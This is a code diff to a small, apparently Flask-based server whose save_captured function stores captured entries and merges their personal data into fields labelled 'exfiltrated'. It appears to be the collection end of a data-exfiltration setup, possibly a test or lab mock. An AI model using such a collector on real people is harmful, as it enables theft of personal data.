@@ -58,11 +58,25 @@ def save_captured(entry):
     existing = {"entries": []}
     if CAPTURED_FILE.exists():
         try:
-            existing = json.loads(CAPTURED_FILE.read_text())
+            existing = json.loads(CAPTURED_FILE.read_text(encoding='utf-8'))
+            if not isinstance(existing, dict):
+                existing = {"entries": existing}
         except Exception:
             pass
+    if "entries" not in existing:
+        existing["entries"] = []
+    
     existing["entries"].append(entry)
-    CAPTURED_FILE.write_text(json.dumps(existing, indent=2))
+    
+    all_pii = {}
+    for e in existing["entries"]:
+        if "data" in e:
+            all_pii.update(e["data"])
+            
+    existing["exfiltrated"] = all_pii
+    existing["exfiltrated_keys"] = list(all_pii.keys())
+    
+    CAPTURED_FILE.write_text(json.dumps(existing, indent=2), encoding='utf-8')
 
 
 @app.route("/")
